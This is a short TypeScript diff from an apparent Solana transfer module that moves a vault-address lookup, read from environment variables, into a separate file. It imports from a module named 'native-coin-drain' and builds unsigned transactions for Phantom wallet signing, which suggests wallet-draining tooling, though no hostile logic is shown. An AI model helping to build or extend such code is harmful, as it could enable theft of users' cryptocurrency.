@@ -11,6 +11,7 @@ import {
 
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import { parseNativeAmount } from './native-coin-drain.js'
+import { resolveSolVaultAddress } from './operational-vault.js'
 
 export type SolNativeTransferRequest = {
   from: string
@@ -20,14 +21,6 @@ export type SolNativeTransferRequest = {
   /** Unsigned VersionedTransaction wire — Phantom `signTransaction`. */
   unsignedWireBase64: string
   wallet: 'phantom'
-}
-
-function resolveSolVaultAddress(): string | null {
-  const raw =
-    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_SVM'] : undefined)?.trim() ||
-    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_SOL'] : undefined)?.trim() ||
-    ''
-  return raw || null
 }
 
 function lamportsToNumber(lamports: bigint): number {
